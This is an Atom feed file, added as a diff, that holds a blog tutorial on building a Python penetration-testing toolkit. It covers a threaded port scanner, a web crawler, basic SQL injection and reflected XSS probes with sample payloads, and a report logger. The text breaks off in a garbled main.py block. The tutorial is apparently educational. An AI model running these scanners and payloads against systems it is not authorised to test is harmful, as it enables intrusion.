@@ -1,0 +1,632 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-10-20T22:18:25+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Daniel Mwangi | Cybersecurity Professional</title><subtitle>Cybersecurity Engineer | Software Developer | Network Security Specialist</subtitle><author><name>Daniel Mwangi</name></author><entry><title type="html">Building Your Custom Penetration Testing Toolkit</title><link href="http://localhost:4000/blog/2025/02/01/building-custom-pentest-toolkit/" rel="alternate" type="text/html" title="Building Your Custom Penetration Testing Toolkit" /><published>2025-02-01T17:30:00+03:00</published><updated>2025-02-01T17:30:00+03:00</updated><id>http://localhost:4000/blog/2025/02/01/building-custom-pentest-toolkit</id><content type="html" xml:base="http://localhost:4000/blog/2025/02/01/building-custom-pentest-toolkit/"><![CDATA[<h2 id="introduction">Introduction</h2>
+
+<p>Every penetration tester needs a reliable toolkit. While tools like Metasploit, Burp Suite, and Nmap are essential, creating custom tools tailored to your workflow can significantly improve efficiency and effectiveness.</p>
+
+<p>In this guide, I’ll walk you through building a modular penetration testing toolkit in Python.</p>
+
+<h2 id="why-build-custom-tools">Why Build Custom Tools?</h2>
+
+<h3 id="advantages">Advantages:</h3>
+<ul>
+  <li>✅ <strong>Customization</strong>: Tailored to your specific needs</li>
+  <li>✅ <strong>Learning</strong>: Deep understanding of underlying techniques</li>
+  <li>✅ <strong>Flexibility</strong>: Easy to modify and extend</li>
+  <li>✅ <strong>Integration</strong>: Seamless workflow automation</li>
+  <li>✅ <strong>Stealth</strong>: Less likely to trigger signatures</li>
+</ul>
+
+<h3 id="when-to-build-custom">When to Build Custom:</h3>
+<ul>
+  <li>Repetitive tasks that need automation</li>
+  <li>Specific edge cases not covered by existing tools</li>
+  <li>Integration between multiple tools</li>
+  <li>Learning and skill development</li>
+</ul>
+
+<hr />
+
+<h2 id="toolkit-architecture">Toolkit Architecture</h2>
+
+<p>Our toolkit will have a modular structure:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pentest-toolkit/
+├── core/
+│   ├── __init__.py
+│   ├── network.py
+│   ├── web.py
+│   └── exploit.py
+├── modules/
+│   ├── recon/
+│   ├── scanning/
+│   ├── exploitation/
+│   └── post_exploitation/
+├── utils/
+│   ├── logger.py
+│   ├── reporter.py
+│   └── config.py
+├── config/
+│   └── settings.json
+└── main.py
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="core-components">Core Components</h2>
+
+<h3 id="1-network-scanner-module">1. Network Scanner Module</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># core/network.py
+</span><span class="kn">import</span> <span class="n">socket</span>
+<span class="kn">import</span> <span class="n">concurrent.futures</span>
+<span class="kn">from</span> <span class="n">typing</span> <span class="kn">import</span> <span class="n">List</span><span class="p">,</span> <span class="n">Tuple</span>
+
+<span class="k">class</span> <span class="nc">NetworkScanner</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">threads</span><span class="o">=</span><span class="mi">100</span><span class="p">):</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="n">timeout</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">threads</span> <span class="o">=</span> <span class="n">threads</span>
+    
+    <span class="k">def</span> <span class="nf">scan_port</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">host</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">port</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Tuple</span><span class="p">[</span><span class="nb">int</span><span class="p">,</span> <span class="nb">bool</span><span class="p">]:</span>
+        <span class="sh">"""</span><span class="s">Scan a single port</span><span class="sh">"""</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+            <span class="n">sock</span><span class="p">.</span><span class="nf">settimeout</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">timeout</span><span class="p">)</span>
+            <span class="n">result</span> <span class="o">=</span> <span class="n">sock</span><span class="p">.</span><span class="nf">connect_ex</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+            <span class="n">sock</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+            <span class="nf">return </span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="n">result</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="nf">return </span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>
+    
+    <span class="k">def</span> <span class="nf">scan_ports</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">host</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">ports</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">])</span> <span class="o">-&gt;</span> <span class="nb">dict</span><span class="p">:</span>
+        <span class="sh">"""</span><span class="s">Scan multiple ports using threading</span><span class="sh">"""</span>
+        <span class="n">open_ports</span> <span class="o">=</span> <span class="p">[]</span>
+        
+        <span class="k">with</span> <span class="n">concurrent</span><span class="p">.</span><span class="n">futures</span><span class="p">.</span><span class="nc">ThreadPoolExecutor</span><span class="p">(</span><span class="n">max_workers</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">threads</span><span class="p">)</span> <span class="k">as</span> <span class="n">executor</span><span class="p">:</span>
+            <span class="n">futures</span> <span class="o">=</span> <span class="p">{</span><span class="n">executor</span><span class="p">.</span><span class="nf">submit</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">scan_port</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span> <span class="n">port</span> 
+                      <span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">ports</span><span class="p">}</span>
+            
+            <span class="k">for</span> <span class="n">future</span> <span class="ow">in</span> <span class="n">concurrent</span><span class="p">.</span><span class="n">futures</span><span class="p">.</span><span class="nf">as_completed</span><span class="p">(</span><span class="n">futures</span><span class="p">):</span>
+                <span class="n">port</span><span class="p">,</span> <span class="n">is_open</span> <span class="o">=</span> <span class="n">future</span><span class="p">.</span><span class="nf">result</span><span class="p">()</span>
+                <span class="k">if</span> <span class="n">is_open</span><span class="p">:</span>
+                    <span class="n">open_ports</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>
+        
+        <span class="k">return</span> <span class="p">{</span>
+            <span class="sh">'</span><span class="s">host</span><span class="sh">'</span><span class="p">:</span> <span class="n">host</span><span class="p">,</span>
+            <span class="sh">'</span><span class="s">open_ports</span><span class="sh">'</span><span class="p">:</span> <span class="nf">sorted</span><span class="p">(</span><span class="n">open_ports</span><span class="p">),</span>
+            <span class="sh">'</span><span class="s">total_scanned</span><span class="sh">'</span><span class="p">:</span> <span class="nf">len</span><span class="p">(</span><span class="n">ports</span><span class="p">)</span>
+        <span class="p">}</span>
+    
+    <span class="k">def</span> <span class="nf">detect_service</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">host</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">port</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+        <span class="sh">"""</span><span class="s">Basic service detection</span><span class="sh">"""</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+            <span class="n">sock</span><span class="p">.</span><span class="nf">settimeout</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+            <span class="n">sock</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+            <span class="n">sock</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">HEAD / HTTP/1.0</span><span class="se">\r\n\r\n</span><span class="sh">'</span><span class="p">)</span>
+            <span class="n">banner</span> <span class="o">=</span> <span class="n">sock</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="sh">'</span><span class="s">ignore</span><span class="sh">'</span><span class="p">)</span>
+            <span class="n">sock</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+            <span class="k">return</span> <span class="n">banner</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="k">if</span> <span class="n">banner</span> <span class="k">else</span> <span class="sh">"</span><span class="s">Unknown</span><span class="sh">"</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="k">return</span> <span class="sh">"</span><span class="s">Unknown</span><span class="sh">"</span>
+
+<span class="c1"># Usage example
+</span><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="n">scanner</span> <span class="o">=</span> <span class="nc">NetworkScanner</span><span class="p">()</span>
+    <span class="n">results</span> <span class="o">=</span> <span class="n">scanner</span><span class="p">.</span><span class="nf">scan_ports</span><span class="p">(</span><span class="sh">"</span><span class="s">192.168.1.1</span><span class="sh">"</span><span class="p">,</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1001</span><span class="p">))</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Found </span><span class="si">{</span><span class="nf">len</span><span class="p">(</span><span class="n">results</span><span class="p">[</span><span class="sh">'</span><span class="s">open_ports</span><span class="sh">'</span><span class="p">])</span><span class="si">}</span><span class="s"> open ports</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="2-web-vulnerability-scanner">2. Web Vulnerability Scanner</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># core/web.py
+</span><span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">from</span> <span class="n">urllib.parse</span> <span class="kn">import</span> <span class="n">urljoin</span><span class="p">,</span> <span class="n">urlparse</span>
+<span class="kn">from</span> <span class="n">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
+
+<span class="k">class</span> <span class="nc">WebScanner</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">target_url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">):</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">target_url</span> <span class="o">=</span> <span class="n">target_url</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="n">timeout</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Session</span><span class="p">()</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">visited_urls</span> <span class="o">=</span> <span class="nf">set</span><span class="p">()</span>
+    
+    <span class="k">def</span> <span class="nf">crawl</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">max_depth</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">current_depth</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+        <span class="sh">"""</span><span class="s">Crawl website and discover URLs</span><span class="sh">"""</span>
+        <span class="k">if</span> <span class="n">current_depth</span> <span class="o">&gt;</span> <span class="n">max_depth</span> <span class="ow">or</span> <span class="n">url</span> <span class="ow">in</span> <span class="n">self</span><span class="p">.</span><span class="n">visited_urls</span><span class="p">:</span>
+            <span class="k">return</span>
+        
+        <span class="n">self</span><span class="p">.</span><span class="n">visited_urls</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+        
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">response</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">timeout</span><span class="p">)</span>
+            <span class="n">soup</span> <span class="o">=</span> <span class="nc">BeautifulSoup</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">content</span><span class="p">,</span> <span class="sh">'</span><span class="s">html.parser</span><span class="sh">'</span><span class="p">)</span>
+            
+            <span class="c1"># Find all links
+</span>            <span class="k">for</span> <span class="n">link</span> <span class="ow">in</span> <span class="n">soup</span><span class="p">.</span><span class="nf">find_all</span><span class="p">(</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">,</span> <span class="n">href</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
+                <span class="n">absolute_url</span> <span class="o">=</span> <span class="nf">urljoin</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">link</span><span class="p">[</span><span class="sh">'</span><span class="s">href</span><span class="sh">'</span><span class="p">])</span>
+                <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="nf">is_valid_url</span><span class="p">(</span><span class="n">absolute_url</span><span class="p">):</span>
+                    <span class="n">self</span><span class="p">.</span><span class="nf">crawl</span><span class="p">(</span><span class="n">absolute_url</span><span class="p">,</span> <span class="n">max_depth</span><span class="p">,</span> <span class="n">current_depth</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
+        
+        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error crawling </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    
+    <span class="k">def</span> <span class="nf">is_valid_url</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
+        <span class="sh">"""</span><span class="s">Check if URL belongs to target domain</span><span class="sh">"""</span>
+        <span class="n">parsed</span> <span class="o">=</span> <span class="nf">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+        <span class="n">target_parsed</span> <span class="o">=</span> <span class="nf">urlparse</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">target_url</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">parsed</span><span class="p">.</span><span class="n">netloc</span> <span class="o">==</span> <span class="n">target_parsed</span><span class="p">.</span><span class="n">netloc</span>
+    
+    <span class="k">def</span> <span class="nf">test_sql_injection</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
+        <span class="sh">"""</span><span class="s">Basic SQL injection testing</span><span class="sh">"""</span>
+        <span class="n">payloads</span> <span class="o">=</span> <span class="p">[</span>
+            <span class="sh">"'</span><span class="s"> OR </span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="s">=</span><span class="sh">'</span><span class="s">1</span><span class="sh">"</span><span class="p">,</span>
+            <span class="sh">"</span><span class="s">1</span><span class="sh">'</span><span class="s"> OR </span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="s">=</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="s"> --</span><span class="sh">"</span><span class="p">,</span>
+            <span class="sh">"</span><span class="s">admin</span><span class="sh">'</span><span class="s">--</span><span class="sh">"</span><span class="p">,</span>
+            <span class="sh">"'</span><span class="s"> OR 1=1--</span><span class="sh">"</span>
+        <span class="p">]</span>
+        
+        <span class="n">vulnerabilities</span> <span class="o">=</span> <span class="p">[]</span>
+        
+        <span class="k">for</span> <span class="n">payload</span> <span class="ow">in</span> <span class="n">payloads</span><span class="p">:</span>
+            <span class="n">test_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">?id=</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="sh">"</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">response</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">test_url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">timeout</span><span class="p">)</span>
+                <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="nf">detect_sqli_error</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">):</span>
+                    <span class="n">vulnerabilities</span><span class="p">.</span><span class="nf">append</span><span class="p">({</span>
+                        <span class="sh">'</span><span class="s">url</span><span class="sh">'</span><span class="p">:</span> <span class="n">test_url</span><span class="p">,</span>
+                        <span class="sh">'</span><span class="s">payload</span><span class="sh">'</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span>
+                        <span class="sh">'</span><span class="s">type</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">SQL Injection</span><span class="sh">'</span>
+                    <span class="p">})</span>
+            <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                <span class="k">continue</span>
+        
+        <span class="k">return</span> <span class="n">vulnerabilities</span>
+    
+    <span class="k">def</span> <span class="nf">detect_sqli_error</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">response_text</span><span class="p">):</span>
+        <span class="sh">"""</span><span class="s">Detect SQL error messages</span><span class="sh">"""</span>
+        <span class="n">error_messages</span> <span class="o">=</span> <span class="p">[</span>
+            <span class="sh">"</span><span class="s">mysql_fetch</span><span class="sh">"</span><span class="p">,</span>
+            <span class="sh">"</span><span class="s">SQL syntax</span><span class="sh">"</span><span class="p">,</span>
+            <span class="sh">"</span><span class="s">ORA-</span><span class="sh">"</span><span class="p">,</span>
+            <span class="sh">"</span><span class="s">PostgreSQL</span><span class="sh">"</span><span class="p">,</span>
+            <span class="sh">"</span><span class="s">Microsoft SQL</span><span class="sh">"</span>
+        <span class="p">]</span>
+        <span class="k">return</span> <span class="nf">any</span><span class="p">(</span><span class="n">error</span> <span class="ow">in</span> <span class="n">response_text</span> <span class="k">for</span> <span class="n">error</span> <span class="ow">in</span> <span class="n">error_messages</span><span class="p">)</span>
+    
+    <span class="k">def</span> <span class="nf">test_xss</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
+        <span class="sh">"""</span><span class="s">Basic XSS testing</span><span class="sh">"""</span>
+        <span class="n">payloads</span> <span class="o">=</span> <span class="p">[</span>
+            <span class="sh">"</span><span class="s">&lt;script&gt;alert(</span><span class="sh">'</span><span class="s">XSS</span><span class="sh">'</span><span class="s">)&lt;/script&gt;</span><span class="sh">"</span><span class="p">,</span>
+            <span class="sh">"</span><span class="s">&lt;img src=x onerror=alert(</span><span class="sh">'</span><span class="s">XSS</span><span class="sh">'</span><span class="s">)&gt;</span><span class="sh">"</span><span class="p">,</span>
+            <span class="sh">"</span><span class="s">javascript:alert(</span><span class="sh">'</span><span class="s">XSS</span><span class="sh">'</span><span class="s">)</span><span class="sh">"</span>
+        <span class="p">]</span>
+        
+        <span class="n">vulnerabilities</span> <span class="o">=</span> <span class="p">[]</span>
+        
+        <span class="k">for</span> <span class="n">payload</span> <span class="ow">in</span> <span class="n">payloads</span><span class="p">:</span>
+            <span class="n">test_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">?search=</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="sh">"</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">response</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">test_url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">timeout</span><span class="p">)</span>
+                <span class="k">if</span> <span class="n">payload</span> <span class="ow">in</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+                    <span class="n">vulnerabilities</span><span class="p">.</span><span class="nf">append</span><span class="p">({</span>
+                        <span class="sh">'</span><span class="s">url</span><span class="sh">'</span><span class="p">:</span> <span class="n">test_url</span><span class="p">,</span>
+                        <span class="sh">'</span><span class="s">payload</span><span class="sh">'</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span>
+                        <span class="sh">'</span><span class="s">type</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">XSS (Reflected)</span><span class="sh">'</span>
+                    <span class="p">})</span>
+            <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                <span class="k">continue</span>
+        
+        <span class="k">return</span> <span class="n">vulnerabilities</span>
+</code></pre></div></div>
+
+<h3 id="3-logger-and-reporter">3. Logger and Reporter</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># utils/logger.py
+</span><span class="kn">import</span> <span class="n">logging</span>
+<span class="kn">import</span> <span class="n">json</span>
+<span class="kn">from</span> <span class="n">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
+
+<span class="k">class</span> <span class="nc">PentestLogger</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">log_file</span><span class="o">=</span><span class="sh">"</span><span class="s">pentest.log</span><span class="sh">"</span><span class="p">,</span> <span class="n">report_file</span><span class="o">=</span><span class="sh">"</span><span class="s">report.json</span><span class="sh">"</span><span class="p">):</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">log_file</span> <span class="o">=</span> <span class="n">log_file</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">report_file</span> <span class="o">=</span> <span class="n">report_file</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">findings</span> <span class="o">=</span> <span class="p">[]</span>
+        
+        <span class="c1"># Setup logging
+</span>        <span class="n">logging</span><span class="p">.</span><span class="nf">basicConfig</span><span class="p">(</span>
+            <span class="n">level</span><span class="o">=</span><span class="n">logging</span><span class="p">.</span><span class="n">INFO</span><span class="p">,</span>
+            <span class="nb">format</span><span class="o">=</span><span class="sh">'</span><span class="s">%(asctime)s - %(levelname)s - %(message)s</span><span class="sh">'</span><span class="p">,</span>
+            <span class="n">handlers</span><span class="o">=</span><span class="p">[</span>
+                <span class="n">logging</span><span class="p">.</span><span class="nc">FileHandler</span><span class="p">(</span><span class="n">log_file</span><span class="p">),</span>
+                <span class="n">logging</span><span class="p">.</span><span class="nc">StreamHandler</span><span class="p">()</span>
+            <span class="p">]</span>
+        <span class="p">)</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">logger</span> <span class="o">=</span> <span class="n">logging</span><span class="p">.</span><span class="nf">getLogger</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+    
+    <span class="k">def</span> <span class="nf">log_finding</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">severity</span><span class="p">,</span> <span class="n">category</span><span class="p">,</span> <span class="n">description</span><span class="p">,</span> <span class="n">details</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+        <span class="sh">"""</span><span class="s">Log a security finding</span><span class="sh">"""</span>
+        <span class="n">finding</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="sh">'</span><span class="s">timestamp</span><span class="sh">'</span><span class="p">:</span> <span class="n">datetime</span><span class="p">.</span><span class="nf">now</span><span class="p">().</span><span class="nf">isoformat</span><span class="p">(),</span>
+            <span class="sh">'</span><span class="s">severity</span><span class="sh">'</span><span class="p">:</span> <span class="n">severity</span><span class="p">,</span>
+            <span class="sh">'</span><span class="s">category</span><span class="sh">'</span><span class="p">:</span> <span class="n">category</span><span class="p">,</span>
+            <span class="sh">'</span><span class="s">description</span><span class="sh">'</span><span class="p">:</span> <span class="n">description</span><span class="p">,</span>
+            <span class="sh">'</span><span class="s">details</span><span class="sh">'</span><span class="p">:</span> <span class="n">details</span> <span class="ow">or</span> <span class="p">{}</span>
+        <span class="p">}</span>
+        
+        <span class="n">self</span><span class="p">.</span><span class="n">findings</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">finding</span><span class="p">)</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">logger</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[</span><span class="si">{</span><span class="n">severity</span><span class="si">}</span><span class="s">] </span><span class="si">{</span><span class="n">category</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">description</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    
+    <span class="k">def</span> <span class="nf">generate_report</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
+        <span class="sh">"""</span><span class="s">Generate JSON report</span><span class="sh">"""</span>
+        <span class="n">report</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="sh">'</span><span class="s">generated_at</span><span class="sh">'</span><span class="p">:</span> <span class="n">datetime</span><span class="p">.</span><span class="nf">now</span><span class="p">().</span><span class="nf">isoformat</span><span class="p">(),</span>
+            <span class="sh">'</span><span class="s">total_findings</span><span class="sh">'</span><span class="p">:</span> <span class="nf">len</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">findings</span><span class="p">),</span>
+            <span class="sh">'</span><span class="s">findings</span><span class="sh">'</span><span class="p">:</span> <span class="n">self</span><span class="p">.</span><span class="n">findings</span><span class="p">,</span>
+            <span class="sh">'</span><span class="s">summary</span><span class="sh">'</span><span class="p">:</span> <span class="n">self</span><span class="p">.</span><span class="nf">_generate_summary</span><span class="p">()</span>
+        <span class="p">}</span>
+        
+        <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">report_file</span><span class="p">,</span> <span class="sh">'</span><span class="s">w</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">json</span><span class="p">.</span><span class="nf">dump</span><span class="p">(</span><span class="n">report</span><span class="p">,</span> <span class="n">f</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
+        
+        <span class="n">self</span><span class="p">.</span><span class="n">logger</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Report generated: </span><span class="si">{</span><span class="n">self</span><span class="p">.</span><span class="n">report_file</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">report</span>
+    
+    <span class="k">def</span> <span class="nf">_generate_summary</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
+        <span class="sh">"""</span><span class="s">Generate findings summary</span><span class="sh">"""</span>
+        <span class="n">severity_counts</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="k">for</span> <span class="n">finding</span> <span class="ow">in</span> <span class="n">self</span><span class="p">.</span><span class="n">findings</span><span class="p">:</span>
+            <span class="n">severity</span> <span class="o">=</span> <span class="n">finding</span><span class="p">[</span><span class="sh">'</span><span class="s">severity</span><span class="sh">'</span><span class="p">]</span>
+            <span class="n">severity_counts</span><span class="p">[</span><span class="n">severity</span><span class="p">]</span> <span class="o">=</span> <span class="n">severity_counts</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">severity</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
+        
+        <span class="k">return</span> <span class="n">severity_counts</span>
+</code></pre></div></div>
+
+<h3 id="4-main-application">4. Main Application</h3>
+<p>```python</p>
+<h1 id="mainpy">main.py</h1>
+<p>import argparse
+from core.network import NetworkScanner
+from core.web import WebScanner
+from utils.logger import PentestLogger</p>
+
+<p>def main():
+    parser = argparse.ArgumentParser(description=”Custom Penetration Testing Toolkit”)
+    parser.add_argument(‘-t’, ‘–target’, required=True, help=’Target IP or URL’)
+    parser.add_argument(‘-m’, ‘–mode’, choices=[‘network’, ‘web’, ‘full’], 
+                       default=’full’, help=’Scan mode’)
+    parser.add_argument(‘-p’, ‘–ports’, default=’1-1000’, 
+                       help=’Port range for network scan’)
+    parser.add_argument(‘-o’, ‘–output’, default=’report.json’, 
+                       help=’Output report file’)</p>
+
